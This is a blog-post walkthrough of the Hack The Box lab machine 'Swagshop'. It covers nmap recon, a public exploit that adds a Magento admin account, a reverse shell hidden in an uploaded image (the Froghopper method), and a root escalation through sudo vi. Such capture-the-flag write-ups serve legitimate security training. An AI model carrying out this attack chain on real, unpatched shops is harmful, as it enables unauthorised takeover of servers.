---
layout: post
title:  "HTB Writeup - Swagshop"
date:   2019-10-06 12:59:50 +0000
categories: jekyll update
---

# HTB Swagshop - writeup

As always, let's start with ```nmap``` to scan for open ports and services:
```
root@kali:~/# nmap -sV -sT -sC -o nmapinitial swagshop.htb 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-27 15:27 EET
Nmap scan report for swagshop.htb (10.10.10.140)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://10.10.10.140/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The interesting stuff here is port 80, since I do not consider ssh as "low-hanging fruit".

http://swagshop.htb/ :
<img src="/assets/swag1.PNG" alt="drawing" width="600"/>
As we can see, there is a web application called Magento, which is a well suited CMS for building e-commerce.

At the bottom of the page, we can see that the version is from 2014. Searching for exploit, I found this[https://www.exploit-db.com/exploits/37977], which creates a new admin user. It worked, a slight edit had to be done though, since all paths are after /index.php. 
```
root@kali:~/Desktop/HTB/boxes/swagshop# python 37977.py 
WORKED
Check http://swagshop.htb/index.php/admin with creds forme:forme
```
To continue the compromission of the machine, I exploited a RCE using The Froghopper Attack method[https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper]. 

Basically you have to:
1. Allow symlinks in template settings
2. Place a php reverse shell to a an image
3. Upload it as a category thumbnail
4. Check /media/catalog/category/shell.php.png
5. Create a Newsletter Templates with the shell and execute it

For the root flag, first thing I did was to get a tty shell with:
```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

I ran the usual recon linux script, and I found that www-data can run vi as root on any file in /var/www/html/ :
``` 
www-data@swagshop:/var/www/html$ sudo -l 
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
www-data@swagshop:/var/www/html$ 
```

So I opened a file in vi as root, then I executed /bin/bas from vi:
```
:!/bin/bash
```

and owned the root flag!
